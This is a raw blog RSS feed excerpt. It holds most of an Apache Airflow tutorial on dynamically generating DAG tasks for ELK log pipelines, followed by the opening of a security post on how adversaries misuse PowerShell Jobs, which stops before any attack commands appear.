&lt;p&gt;&lt;strong&gt;Dynamic generation for tasks -&lt;/strong&gt; When I tried to integrate the pipelines with our own &lt;strong&gt;&lt;a href=&#34;https://www.elastic.co/what-is/elk-stack&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;ELK&lt;/a&gt;&lt;/strong&gt; stack, I found the problem about &lt;strong&gt;how to dynamically generate the tasks in a dag&lt;/strong&gt;. This problem comes from the different log types, which include Linux, Windows, VPN and so on. I also found the same type of logs from different clients require different treatment too. The generation of tasks should be &lt;strong&gt;scalable&lt;/strong&gt; and &lt;strong&gt;automatic&lt;/strong&gt;. &lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;In the first place, I had many choices to make. For the operator, I can choose from the PythonOperator, BaseOperator, or BashOperator. For the dependencies, I can choose TriggerDagRunOperator, Xcom, or SubDag.&lt;/p&gt;
&lt;p&gt;After some testing, I found the most effective solution is usually the simplest, even when not 100% perfect. I chose the following combination:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;BaseOperator + DummyOperator + Plugins + Xcom + For loop + ExternalTaskSensor&lt;/strong&gt;&lt;/p&gt;
&lt;h4&gt;&lt;strong&gt;1. DummyOperator Usage&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;1-dummyoperator-usage&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#1-dummyoperator-usage&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;&lt;a href=&#34;https://airflow.apache.org/docs/apache-airflow/1.10.12/_modules/airflow/operators/dummy_operator.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;DummyOperator&lt;/a&gt; can be used to group tasks in a DAG. In order to structure different tasks into one nice workflow, I used the DummyOperator to connect them. They won’t be executed by the executor. After introducing those two tasks, there is a common start task and a common end task to connect all middle parallel tasks.&lt;/p&gt;
&lt;table class=&#34;has-black-background-color has-background&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;start_task = DummyOperator(&lt;br&gt;task_id=&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-vivid-green-cyan-color&#34;&gt;&#39;start_task&#39;&lt;/mark&gt;,&lt;br&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;dag=dag&lt;/mark&gt;&lt;br&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;)&lt;/mark&gt;&lt;br&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;end_task = DummyOperator(&lt;br&gt;task_id = &lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-vivid-green-cyan-color&#34;&gt;&#39;end_task&#39;&lt;/mark&gt;,&lt;br&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;dag = dag&lt;br&gt;)&lt;/mark&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;&lt;img src=&#34;https://lh5.googleusercontent.com/gtkYla7hRWDWybDdyW0P-nCA1BWhzJ4G8ScLMzF8n6PKmLG2OKgBvAizVAo3uCPr0WMABiRN5xej9A_n9IsW9bRRph86Jez-ojx7HVbF_rumb5OgR0-EYo9LnPrO0lPEEczWrDApp_FRZQ6ghYZqh9I-YsX7uB-kNIjIo22pIzHJiBX99h7OMXJ5KJLZ&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;PNG1：&lt;a href=&#34;https://assets.bbhub.io/company/sites/40/2018/05/airflow.png&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Airflow graph view&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;For the dynamic generation of tasks, I want to introduce a kind of structure to organise the code. Most of the logs share the same processing logic, so I need to introduce several automatic variables inside the tasks. The basic structure would look like the following:&lt;/p&gt;
&lt;table class=&#34;has-white-color has-black-background-color has-text-color has-background&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-vivid-green-cyan-color&#34;&gt;&#39;&#39;&#39;&lt;br&gt;&amp;nbsp; def Dynamic_Function(variable):&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; task_1 = Function1(&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; task_id = &#39;task_{}&#39;.format(variable),&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; dag = dag,&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; ...&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; )&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; return task_1&lt;br&gt;&#39;&#39;&#39;&lt;/mark&gt;&lt;br&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;for &lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;variable&lt;/mark&gt; &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;in&lt;/mark&gt; &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;variables:&lt;/mark&gt;&lt;br&gt;&amp;nbsp; task_1 = Dynamic_Function(variable)&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;The variables can be read it from the environment variables or just set it as a list:&lt;/p&gt;
&lt;p&gt;# the python way to read environment values from .env file:&lt;/p&gt;
&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;os.getenv&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-vivid-green-cyan-color&#34;&gt;(&#39;variables&#39;&lt;/mark&gt;).split(&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-vivid-green-cyan-color&#34;&gt;&#39;&#39;&lt;/mark&gt;)&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;This method is not that complex, but it is quite useful when there are multiple tasks sharing the same processing logic and there is only one difference of variable in them, allowing the project to be easily scaled.  &lt;/p&gt;
&lt;h4&gt;&lt;strong&gt;2. Plugin Operator and BaseOperator&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;2-plugin-operator-and-baseoperator&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#2-plugin-operator-and-baseoperator&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;For the Function1, it is defined in a customised way in &lt;strong&gt;plugins/operators.&lt;/strong&gt; You can find the detailed information on this &lt;a href=&#34;http://michal.karzynski.pl/blog/2017/03/19/developing-workflows-with-apache-airflow/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;link&lt;/a&gt;&lt;strong&gt;.&lt;/strong&gt; The main context is shown below**:**&lt;/p&gt;
&lt;table class=&#34;has-black-background-color has-background&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;from &lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;airflow.plugins_manager&lt;/mark&gt; &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;import&lt;/mark&gt; &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;AirflowPlugin&lt;/mark&gt;&lt;br&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;from&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt; airflow.utils.decorators&lt;/mark&gt; &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;import&lt;/mark&gt; &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;apply_defaults&lt;/mark&gt;&lt;br&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;class &lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-orange-color&#34;&gt;MyFirstOperator&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;(BaseOperator): &amp;nbsp; &amp;nbsp;&lt;/mark&gt;&lt;br&gt;&amp;nbsp; &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-pale-pink-color&#34;&gt;@apply_defaults&amp;nbsp; &amp;nbsp;&lt;/mark&gt;&lt;br&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;&amp;nbsp; def &lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-orange-color&#34;&gt;__init__&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;(self, my_operator_param, *args, **kwargs):&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; self.operator_param = my_operator_param&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; super(MyFirstOperator, self).__init__(*args, **kwargs) &amp;nbsp; &amp;nbsp;&lt;/mark&gt;&lt;br&gt;&amp;nbsp;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt; def&lt;/mark&gt; &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-orange-color&#34;&gt;execute&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;(self, context):&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/mark&gt;&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ...&lt;br&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;class&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-orange-color&#34;&gt; MyFirstPlugin&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;(AirflowPlugin):&lt;/mark&gt;&lt;br&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;&amp;nbsp; name =&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-vivid-green-cyan-color&#34;&gt; &#34;my_first_plugin&#34;&amp;nbsp; &amp;nbsp;&lt;/mark&gt;&lt;br&gt;&amp;nbsp; &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;operators = [MyFirstOperator]&lt;/mark&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;I use it for the reason that I do not need to put all my code in the DAG. Otherwise, the DAG code would be extremely redundant and hard to manage.&lt;/p&gt;
&lt;p&gt;I use &lt;strong&gt;BaseOperator&lt;/strong&gt; instead of PythonOperator because of the simplicity. The PythonOperator is more complex to control and needs to set more unnecessary parameters.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;With the above two solutions, the dynamic tasks can be easily built in one DAG now&lt;/strong&gt;. The following solutions are more for the connection and concurrency problems I met during a project. &lt;/p&gt;
&lt;h4&gt;&lt;strong&gt;3. Xcom &amp;amp; ExternalTaskSensor&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;3-xcom--externaltasksensor&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#3-xcom--externaltasksensor&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Now, I have to solve three key problems:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;How to save the result for the next task? &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;How to get the result from the last task?&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;How to make sure the result is within the right time interval?&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Airflow provides powerful solutions for those problems with &lt;a href=&#34;https://airflow.apache.org/docs/apache-airflow/stable/concepts/xcoms.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;Xcom&lt;/strong&gt;&lt;/a&gt; and &lt;a href=&#34;https://airflow.apache.org/docs/apache-airflow/1.10.4/_api/airflow/sensors/external_task_sensor/index.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;ExternalTaskSensor&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;To save the result from the current task, Xcom is used for this requirement. It is a bit similar to git. To use it, xcom_push and xcom_pull are the main functions needed. But there is a limitation for the size, which is &lt;a href=&#34;https://airflow.apache.org/docs/apache-airflow/stable/_modules/airflow/models/xcom.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;48KB&lt;/strong&gt;&lt;/a&gt;. Normally, you do not need to worry about the size, but it is advisable to try to save the middle variable value in xcom while not using big files. &lt;/p&gt;
&lt;p&gt;If you want to extract the result obtained from the previous DAG with a specified task combing with the dynamic tasks, the extraction process is independent and you should use the ExternalTaskSensor with the following setting:&lt;/p&gt;
&lt;table class=&#34;has-black-background-color has-background&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;for&lt;/mark&gt; &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;variable&lt;/mark&gt; &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;in&lt;/mark&gt; &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;variables:&lt;/mark&gt;&lt;br&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;...&lt;br&gt;&amp;nbsp; # create the task to depend on the up_stream dag&lt;br&gt;&amp;nbsp; external_sensor = ExternalTaskSensor(&lt;/mark&gt;&lt;br&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;&amp;nbsp; task_id=&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-vivid-green-cyan-color&#34;&gt;&#39;ext_sensor_task&#39;&lt;/mark&gt;,&lt;br&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;&amp;nbsp; external_dag_id=&#39;xxx&#39;,&lt;/mark&gt;&lt;br&gt;&amp;nbsp; external_task_id=&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-vivid-green-cyan-color&#34;&gt;&#39;xxx_{}&#39;&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;.format(variable),&lt;/mark&gt;&lt;br&gt;&amp;nbsp;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt; timeout =&lt;/mark&gt; &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-pale-pink-color&#34;&gt;300&lt;/mark&gt;,&lt;br&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;&amp;nbsp; dag=dag,&lt;br&gt;&amp;nbsp; )&lt;br&gt;...&lt;/mark&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;I have to mention here, &lt;strong&gt;you should not use end_task in the previous DAG.&lt;/strong&gt; If you do not want all tasks to be finished on the previous day, then go through the next day.&lt;/p&gt;
&lt;h4&gt;&lt;strong&gt;4. Execution Time&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;4-execution-time&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#4-execution-time&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Execution time is kind of limited in Airflow in version 1.x. I have not tested the 2.x. In version 1.x, it does not help to change the timezone in airflow.cfg.&lt;/p&gt;
&lt;p&gt;But you can use the specified way to solve the problem. The &lt;strong&gt;pendulum library&lt;/strong&gt; is a really great option.&lt;/p&gt;
&lt;table class=&#34;has-black-background-color has-background&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;import&lt;/mark&gt; &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;pendulum&lt;/mark&gt;&lt;br&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;# get the format date string&lt;br&gt;current_date = pendulum.datetime.now().strftime(&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-vivid-green-cyan-color&#34;&gt;&#34;%Y, %m, %d, %H&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;&#34;)&lt;br&gt;dag = DAG(&lt;br&gt;&amp;nbsp; dag_id = dag_id,&lt;br&gt;&amp;nbsp; # get the datetime type value&lt;br&gt;&amp;nbsp; start_date = pendulum.strptime(current_date, &#34;&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-vivid-green-cyan-color&#34;&gt;%Y, %m, %d, %H&#34;&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;).astimezone(&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-vivid-green-cyan-color&#34;&gt;&#39;Europe/London&#39;&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;).subtract(hours=&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-pale-pink-color&#34;&gt;1&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;),&lt;br&gt;&amp;nbsp; default_args = default_args,&lt;br&gt;&amp;nbsp; schedule_interval = timedelta(hours=&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-pale-pink-color&#34;&gt;1&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;),&lt;br&gt;)&lt;/mark&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;With this setting, you can introduce a trial task before the current time and you can make sure the time is the same as your local timezone. &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. ExternalTaskSensor Stuck Problem&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;When people design dependent tasks in different dags, the ExternalTaskSensor is a common function to use. But if you do not follow some best practices, it can quite easily get stuck. The main problem relates to the time settings for DAGs. Among the errors that can occur, the most common is where the previous task generates a large middle value and it is impossible to transfer to an external task because of the &lt;a href=&#34;https://airflow.apache.org/docs/stable/_modules/airflow/models/xcom.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;size limitation&lt;/strong&gt;&lt;/a&gt; for middle value storage. &lt;/p&gt;
&lt;p&gt;So, how to best set the time for DAGs? Based on an answer from &lt;a href=&#34;https://stackoverflow.com/questions/46807297/airflow-externaltasksensor-gets-stuck&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;stackoverflow&lt;/strong&gt;&lt;/a&gt;: the DAGs don&amp;rsquo;t need to have the same start_date. If you create your ExternalTaskSensor task without the execution_delta or execution_date_fn, then the two DAGs need to have the same &lt;strong&gt;&lt;em&gt;execution date&lt;/em&gt;&lt;/strong&gt;. It so happens that if two DAGs have the same schedule, a scheduled task running in each interval will have the same execution date.&lt;/p&gt;
&lt;p&gt;The optimal choice is to exclude execution_delta and execution_data_fn if you encounter challenges when computing the time. You should &lt;strong&gt;never manually trigger (in the Links column) the DAG in WebUI&lt;/strong&gt; &lt;strong&gt;if the result will be sent to the next DAG&lt;/strong&gt;. It will generate different execution dates. In practice, I defined the same start_date by setting a specific date. When I start the DAGs in Web UI, I will &lt;strong&gt;press all the DAG buttons&lt;/strong&gt; at the same time if those DAGs are dependent on one other.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/DAGs-View-PNG2.png&#34; alt=&#34;DAGs View PNG2&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;PNG2：&lt;a href=&#34;https://airflow.apache.org/docs/apache-airflow/1.10.4/ui.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;DAGs View&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;This is a very brief description of my solutions for the tricky problems I encountered. Thanks for reading!&lt;/p&gt;
&lt;h4&gt;&lt;strong&gt;References:&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;references&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#references&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;&lt;a href=&#34;https://stackoverflow.com/questions/45568439/how-do-i-trigger-airflow-dag-using-triggerdagrunoperator&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;How do I trigger Airflow -dag using TriggerDagRunOperator&lt;/strong&gt;&lt;/a&gt; - &lt;a href=&#34;https://stackoverflow.com/questions/45568439/how-do-i-trigger-airflow-dag-using-triggerdagrunoperator&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;_I have found following link: https://www.linkedin.com/pulse/airflow-lesson-1-triggerdagrunoperator-siddharth-anand…_stackoverflow.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://stackoverflow.com/questions/46807297/airflow-externaltasksensor-gets-stuck&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;Airflow ExternalTaskSensor gets stuck&lt;/strong&gt;&lt;/a&gt; - &lt;a href=&#34;https://stackoverflow.com/questions/46807297/airflow-externaltasksensor-gets-stuck&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;_I&amp;rsquo;m trying to use ExternalTaskSensor and it gets stuck at poking another DAG&amp;rsquo;s task, which has already been…_stackoverflow.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://medium.com/@delmira91/sensing-the-completion-of-external-airflow-tasks-827344d03142&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;Sensing the completion of external airflow tasks&lt;/strong&gt;&lt;/a&gt; - &lt;a href=&#34;https://medium.com/@delmira91/sensing-the-completion-of-external-airflow-tasks-827344d03142&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;_(Not the best title)_medium.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://towardsdatascience.com/creating-a-dynamic-dag-using-apache-airflow-a7a6f3c434f3&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;Creating a dynamic DAG using Apache Airflow&lt;/strong&gt;&lt;/a&gt; - &lt;a href=&#34;https://towardsdatascience.com/creating-a-dynamic-dag-using-apache-airflow-a7a6f3c434f3&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;_Today we want to share with you one problem we solved by using Apache Airflow. We have a project comprising more than…_towardsdatascience.com&lt;/a&gt;&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>PowerShell Jobs</title>
      <link>//localhost:1313/articles/2021/10/2021-10-07-powershell-jobs/</link>
      <pubDate>Thu, 07 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2021/10/2021-10-07-powershell-jobs/</guid>
      <description>
        
        
        &lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://twitter.com/Purp1eW0lf&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;By Dray Agha&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/Jumpsec_icons_Detection-1.png&#34; alt=&#34;Jumpsec icons Detection 1&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;JUMPSEC investigators recently observed an adversary weaponising PowerShell Jobs to schedule their attack, whilst responding to an incident. In this article, we discuss what PowerShell jobs are, how they can be leveraged for malicious purposes, and how defenders can protect, detect, and respond to neutralise the threat. &lt;/p&gt;
&lt;h1&gt;What are PowerShell Jobs&lt;/h1&gt;&lt;p&gt;Adversaries are known to &lt;a href=&#34;https://attack.mitre.org/techniques/T1053/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;schedule parts&lt;/a&gt; of their campaign once they have infiltrated a target network. They may timetable their attack for an opportune moment (such as during unsociable hours, based on the region in which the infrastructure is hosted, or support teams reside) or set up a recurring task to ensure ongoing &lt;a href=&#34;https://attack.mitre.org/tactics/TA0003/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;persistence&lt;/a&gt;. &lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://docs.microsoft.com/en-us/powershell/module/psscheduledjob/?view=powershell-5.1&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;PowerShell jobs&lt;/a&gt; aren’t designed to be inherently malicious and have many legitimate use cases. However, as is often the case in cyber security, the innate functionality of PowerShell Jobs and its susceptibility to abuse means it can also be leveraged by an adversary. &lt;/p&gt;
&lt;h2&gt;Using legitimately&lt;span class=&#34;absolute -mt-20&#34; id=&#34;using-legitimately&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#using-legitimately&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;When using the command line for most operating systems, users have to run a command and wait a microsecond for the system to return with a reply. This can be inconvenient - for example, when running a script that will take a while to run, or when you know that you want to run the command at a specific time or date in the future. &lt;/p&gt;
&lt;p&gt;When using PowerShell, a job allows you to push a task into the background. PowerShell will continue to work on your query behind the scenes and allow you to continue using the shell for other things. &lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;#Push command to the background&lt;/span&gt;
